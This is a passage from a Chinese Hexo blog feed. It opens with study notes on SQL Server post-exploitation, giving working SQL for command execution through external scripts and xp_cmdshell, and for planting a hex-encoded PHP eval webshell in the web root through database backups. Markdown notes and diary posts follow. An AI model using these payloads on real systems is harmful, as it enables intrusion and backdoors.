sp_execute_external_script 执行 Python 和 R 脚本。利用前提sqlserver系统权限可以执行外部脚本</p><p>开启sp_execute_external_script ：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 开启和关闭需要dba权限</span><br><span class="hljs-comment">-- 开启</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;external scripts enabled&#x27;</span>,<span class="hljs-number">1</span>;RECONFIGURE<br><span class="hljs-comment">-- 关闭</span><br><span class="hljs-keyword">EXEC</span> sp_configure <span class="hljs-string">&#x27;external scripts enabled&#x27;</span>,<span class="hljs-number">0</span>;RECONFIGURE<br></code></pre></td></tr></table></figure><p>执行命令：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- dbo和dba权限均可执行命令</span><br><span class="hljs-comment">-- 利用R执行命令</span><br><span class="hljs-keyword">EXEC</span> sp_execute_external_script<br><span class="hljs-variable">@language</span><span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;R&#x27;</span>,<br><span class="hljs-variable">@script</span><span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;OutputDataSet &lt;- data.frame(system(&quot;cmd.exe /c whoami&quot;,intern=T))&#x27;</span><br><span class="hljs-keyword">WITH</span> <span class="hljs-keyword">RESULT</span> SETS (([cmd_out] text));<br><span class="hljs-comment">--利用python执行命令</span><br><span class="hljs-keyword">exec</span> sp_execute_external_script<br><span class="hljs-variable">@language</span> <span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;Python&#x27;</span>,<br><span class="hljs-variable">@script</span><span class="hljs-operator">=</span>N<span class="hljs-string">&#x27;import subprocess</span><br><span class="hljs-string">p = subprocess.Popen(&quot;cmd.exe /c whoami&quot;, stdout=subprocess.PIPE)</span><br><span class="hljs-string">OutputDataSet = pandas.DataFrame([str(p.stdout.read(), &quot;utf-8&quot;)])&#x27;</span><br></code></pre></td></tr></table></figure><h5 id="差异备份写webshell-dbo权限"><a href="#差异备份写webshell-dbo权限" class="headerlink" title="差异备份写webshell(dbo权限)"></a>差异备份写webshell(dbo权限)</h5><p>dbo和dba都有备份数据库权限，我们可以把数据库备份成可执行脚本文件放到web目录里，获得 webshell。</p><p>利用前提:<br>知道网站绝对路径且路径可写<br>利用数据库必须存在备份文件<br>差异备份：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-comment">-- 生成备份文件</span><br>backup database test <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:\phpstudy_pro\WWW\1.bak&#x27;</span>;<br><span class="hljs-comment">-- 创建表并写入一句话木马</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> test([cmd][image]);<br><span class="hljs-keyword">Insert</span> <span class="hljs-keyword">into</span> test(cmd)<span class="hljs-keyword">values</span>(<span class="hljs-number">0x3c3f70687020406576616c28245f524551554553545b2761275d293b3f3e</span>);<br><span class="hljs-comment">-- 将数据库进行差异备份</span><br>backup database test <span class="hljs-keyword">to</span> disk<span class="hljs-operator">=</span><span class="hljs-string">&#x27;C:\phpstudy_pro\WWW\shell.php&#x27;</span> <span class="hljs-keyword">WITH</span> DIFFERENTIAL,FORMAT;<br></code></pre></td></tr></table></figure><p>日志备份：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">alter</span> database test <span class="hljs-keyword">set</span> RECOVERY <span class="hljs-keyword">FULL</span> <span class="hljs-comment">-- 将数据库修改为完整模式</span><br><span class="hljs-keyword">create</span> <span class="hljs-keyword">table</span> cmd (a image) <span class="hljs-comment">-- 新建表</span><br>backup log test <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;c:\phpstudy_pro\www\2.bak&#x27;</span> <span class="hljs-keyword">with</span> init <span class="hljs-comment">-- 备份表</span><br><span class="hljs-keyword">insert</span> <span class="hljs-keyword">into</span> cmd (a) <span class="hljs-keyword">values</span> (<span class="hljs-number">0x3c3f70687020406576616c28245f524551554553545b2761275d293b3f3e</span>) <span class="hljs-comment">-- 将一句话木马写入表中</span><br>backup log test <span class="hljs-keyword">to</span> disk <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;c:\phpstudy_pro\www\2.php&#x27;</span> <span class="hljs-comment">-- 备份操作日志到指定脚本文件</span><br></code></pre></td></tr></table></figure><h5 id="不支持堆叠的情况下执行系统命令"><a href="#不支持堆叠的情况下执行系统命令" class="headerlink" title="不支持堆叠的情况下执行系统命令"></a>不支持堆叠的情况下执行系统命令</h5><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">where</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> if <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">execute</span>(<span class="hljs-string">&#x27;exec sp_configure &#x27;&#x27;show advanced options&#x27;&#x27;, 1;reconfigure;exec sp_configure &#x27;&#x27;xp_cmdshell&#x27;&#x27;, 1;reconfigure;exec xp_cmdshell &#x27;&#x27;whoami&#x27;&#x27;&#x27;</span>);<br></code></pre></td></tr></table></figure><h4 id="Oracle提权"><a href="#Oracle提权" class="headerlink" title="Oracle提权"></a>Oracle提权</h4><h5 id="利用java权限"><a href="#利用java权限" class="headerlink" title="利用java权限"></a>利用java权限</h5><h5 id="利用存储过程"><a href="#利用存储过程" class="headerlink" title="利用存储过程"></a>利用存储过程</h5><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><section class="footnotes"><div class="footnote-list"><ol><li><span id="fn:1" class="footnote-text"><span><a href="https://www.bilibili.com/video/BV1bX4y1V7KF/?spm_id_from=333.999.0.0&vd_source=249ffa3703b6e86763a24381e58a14a4">激荡四十年-1988</a><a href="#fnref:1" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:2" class="footnote-text"><span><a href="http://phrack.org/issues/54/8.html#article">http://phrack.org/issues/54/8.html#article</a><a href="#fnref:2" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:3" class="footnote-text"><span><a href="https://www.51cto.com/article/231122.html">https://www.51cto.com/article/231122.html</a><a href="#fnref:3" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:4" class="footnote-text"><span><a href="https://github.com/sqlmapproject/sqlmap/wiki/History">https://github.com/sqlmapproject/sqlmap/wiki/History</a><a href="#fnref:4" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:5" class="footnote-text"><span><a href="https://blog.csdn.net/weixin_44426869/article/details/104326877">https://blog.csdn.net/weixin_44426869/article/details/104326877</a><a href="#fnref:5" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:6" class="footnote-text"><span><a href="https://blog.csdn.net/qq_42477007/article/details/96492174">https://blog.csdn.net/qq_42477007/article/details/96492174</a><a href="#fnref:6" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:7" class="footnote-text"><span><a href="https://www.cnblogs.com/xhds/p/12322839.html">https://www.cnblogs.com/xhds/p/12322839.html</a><a href="#fnref:7" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:8" class="footnote-text"><span><a href="https://cloud.tencent.com/developer/article/1920885">https://cloud.tencent.com/developer/article/1920885</a><a href="#fnref:8" rev="footnote" class="footnote-backref"> ↩</a></span></span></li><li><span id="fn:9" class="footnote-text"><span><a href="https://zhuanlan.zhihu.com/p/591938680">https://zhuanlan.zhihu.com/p/591938680</a><a href="#fnref:9" rev="footnote" class="footnote-backref"> ↩</a></span></span></li></ol></div></section>]]></content>
    
    
    <categories>
      
      <category>安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SQL Injection</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Markdown的学习记录</title>
    <link href="/2023/03/20/MarkDown%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    <url>/2023/03/20/MarkDown%E7%9A%84%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/</url>
    
    <content type="html"><![CDATA[<h1 id="markdown学习之旅"><a href="#markdown学习之旅" class="headerlink" title="markdown学习之旅"></a>markdown学习之旅</h1><p>今天开始学习markdown的语法，以后也将会用markdown记录学习过程，俗话说好记性不如 <del>烂笔头</del> 键盘。</p><p>markdown语法大概分为两个部分 <strong><a href="#%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95">基础语法</a></strong> 与 <strong><a href="#%E6%89%A9%E5%B1%95%E8%AF%AD%E6%B3%95">扩展语法</a></strong> ，一起学习吧 &#x1F60F; 。</p><h2 id="基础语法"><a href="#基础语法" class="headerlink" title="基础语法"></a>基础语法</h2><h3 id="标题语法"><a href="#标题语法" class="headerlink" title="标题语法"></a>标题语法</h3><pre><code class="hljs">#    // 一级标题##   // 二级标题###  // 三级标题</code></pre><h3 id="强调语法"><a href="#强调语法" class="headerlink" title="强调语法"></a>强调语法</h3><pre><code class="hljs">* &amp; _       // 表示斜体,如强调的内容在单词或短语中间用*** &amp; __     // 表示粗体**_ &amp; __*   // 表示粗斜体</code></pre><h3 id="引用语法"><a href="#引用语法" class="headerlink" title="引用语法"></a>引用语法</h3><pre><code class="hljs">&gt;     // 单行块引用&gt;     // 多行块引用&gt;     // 多行块引用&gt;     // 嵌套块引用&gt;&gt;    // 嵌套块引用&gt; *sheny* // 块引用其他元素</code></pre><h3 id="列表语法"><a href="#列表语法" class="headerlink" title="列表语法"></a>列表语法</h3><pre><code class="hljs">1.    // 数字与英文句号组成有序列表2.3.* &amp; _ &amp; +  // 单个字符组成无序列表* sheny    // 列表嵌套* sheny    * sheny    * sheny* sheny    // 嵌套块引用* sheny    &gt; sheny    &gt;sheny* sheny    // 嵌套代码块需要使用八个空格或两个制表符* sheny    &lt;html&gt;        &lt;head&gt;             &lt;title&gt;Test&lt;/title&gt;        &lt;/head&gt;</code></pre><h3 id="代码语法"><a href="#代码语法" class="headerlink" title="代码语法"></a>代码语法</h3><pre><code class="hljs">`        // 反引号包裹``       // 反引号的转义&lt;html&gt;   // 用四个空格或一个制表符创建代码块    &lt;head&gt;    &lt;/head&gt;&lt;/html&gt;</code></pre><h3 id="分隔线语法"><a href="#分隔线语法" class="headerlink" title="分隔线语法"></a>分隔线语法</h3><pre><code class="hljs">*** &amp; --- &amp; ____  // 三个字符创建分割线，且不能有其他内容，且应该前后均留空白行</code></pre><h3 id="链接语法"><a href="#链接语法" class="headerlink" title="链接语法"></a>链接语法</h3><pre><code class="hljs">[链接显示名](链接地址 &quot;链接title&quot;)  // 如下</code></pre><p><a href="https://markdown.com.cn/basic-syntax/links.html" title="快去吧">MarkDown语法官方</a></p><pre><code class="hljs">&lt;https://shenysec.github.io&gt; // 网站&lt;shenysec@github.com&gt;        // 邮箱这是到**[google](www.google.com)**的超链接 // 带格式化链接[asdad] [1]  // 引用类型链接，需与下部分一起使用[1]: https:shenysec.github.io (title) // 这部分格式比较自由</code></pre><h3 id="图片语法"><a href="#图片语法" class="headerlink" title="图片语法"></a>图片语法</h3><pre><code class="hljs">![图片alt](图片链接 &quot;图片title&quot;)[![图片alt](图片链接 &quot;图片title&quot;)](链接地址) // 图片添加链接，链接语法的嵌套</code></pre><h2 id="扩展语法"><a href="#扩展语法" class="headerlink" title="扩展语法"></a>扩展语法</h2><h3 id="表格"><a href="#表格" class="headerlink" title="表格"></a>表格</h3><pre><code class="hljs">| Syntax      | Description |  // --- 创建标题 | 分膈每列 | ----------- | ----------- || Header      | Title       || Paragraph   | Text        |</code></pre><p>官方推荐的在线图形化表格创建<a href="https://www.tablesgenerator.com/markdown_tables">Markdown Tables Generator</a></p><pre><code class="hljs">| Syntax      | Description | Test Text     || :---        |    :----:   |          ---: | // 表格对齐| Header      | Title       | [sheny]()     | // 添加链接| Paragraph   | Text        | `code`        | // 表格添加代码块</code></pre><h3 id="围栏代码块"><a href="#围栏代码块" class="headerlink" title="围栏代码块"></a>围栏代码块</h3><figure class="highlight json"><figcaption><span> </span><a href="//">输入对应语言实现语法高亮</a></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs json">&#123;<br><span class="hljs-attr">&quot;firstName&quot;</span>: <span class="hljs-string">&quot;John&quot;</span>,<br><span class="hljs-attr">&quot;lastName&quot;</span>: <span class="hljs-string">&quot;Smith&quot;</span>,<br><span class="hljs-attr">&quot;age&quot;</span>: <span class="hljs-number">25</span><br>&#125;<br></code></pre></td></tr></table></figure><h3 id="脚注"><a href="#脚注" class="headerlink" title="脚注"></a>脚注</h3><pre><code class="hljs">这是脚注[^1]  // 类似引用类型链接</code></pre><h3 id="标题编号"><a href="#标题编号" class="headerlink" title="标题编号"></a>标题编号</h3><pre><code class="hljs">### 标题 &#123;#name&#125;  // 使用链接，链接到这个标题，&#123;#是hexo的注释保留符，这俩会冲突但是hexo会有默认的title，直接链接title就可以了</code></pre><h3 id="定义列表"><a href="#定义列表" class="headerlink" title="定义列表"></a>定义列表</h3><pre><code class="hljs">First Term    // ：+空格 创建定义列表: This is the definition of the first term.</code></pre><h3 id="删除线"><a href="#删除线" class="headerlink" title="删除线"></a>删除线</h3><pre><code class="hljs">~~   // 使用两个波浪符号包括删除线，波浪号前面需要有空格</code></pre><h3 id="任务列表"><a href="#任务列表" class="headerlink" title="任务列表"></a>任务列表</h3><pre><code class="hljs">- [x] Write the press release  // 创建一个带复选框的列表+ [ ] Update the website+ [ ] Contact the media</code></pre><h3 id="使用Emoji"><a href="#使用Emoji" class="headerlink" title="使用Emoji"></a>使用Emoji</h3><pre><code class="hljs">:joy: // 使用冒号包裹emoji简码，简码如下：emoji简码在markdown中有两种使用方法通用代码 Unicode：   // hexo 只支持通用代码，到处都是坑    使用格式为：:+对应英文单词+:&amp;#x+unicode+;非通用代码：    使用格式为：:+对应英文单词+:</code></pre><p><a href="http://www.unicode.org/emoji/charts/full-emoji-list.html" title="Unicode">Emoji Unicode全列表</a></p><p><a href="https://www.webfx.com/tools/emoji-cheat-sheet/">Emoji 简易代码全列表</a></p><h3 id="自动网址链接"><a href="#自动网址链接" class="headerlink" title="自动网址链接"></a>自动网址链接</h3><pre><code class="hljs">https:shenysec.github.io    // markdown会自动链接url`https:shenysec.github.io`  // 禁用自动url链接</code></pre>]]></content>
    
    
    <categories>
      
      <category>杂学</category>
      
    </categories>
    
    
    <tags>
      
      <tag>markdown</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>One Day</title>
    <link href="/2023/03/19/One-Day/"/>
    <url>/2023/03/19/One-Day/</url>
    
    <content type="html"><![CDATA[<p>大概从今天开始记录。俗话说好记性不如烂笔头。</p>]]></content>
    
    
    <categories>
      
      <category>吐槽</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>6月12</title>
    <link href="/2022/06/12/6%E6%9C%8812/"/>
    <url>/2022/06/12/6%E6%9C%8812/</url>
    
    <content type="html"><![CDATA[<p>好久没看blog了差点搞忘记咋搞了</p><p>markdown也没有学，域名也过期了，哎</p>]]></content>
    
    
    <categories>
      
      <category>吐槽</category>
      
    </categories>
    
    
  </entry>
  
  
  
  
</search>
